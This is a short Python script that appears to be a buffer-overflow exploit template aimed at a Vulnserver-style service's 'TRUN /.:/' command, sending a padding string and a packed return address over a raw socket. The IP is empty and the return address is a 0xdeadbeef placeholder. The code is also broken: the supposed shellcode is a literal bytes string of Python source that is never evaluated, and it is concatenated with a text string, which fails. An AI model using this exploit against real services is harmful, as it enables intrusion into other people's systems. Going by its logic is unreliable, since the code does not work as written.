#!/usr/bin/python

import sys,socket, struct


IP=""
port=1



pointer_to_convert= 0xdeadbeef
pointer = struct.pack("<I", pointer_to_convert) #retruens bytes

shellcode = b"('A' * offset_found + pointer)"

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP,port))
                            s.send (('TRUN /.:/' + shellcode))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
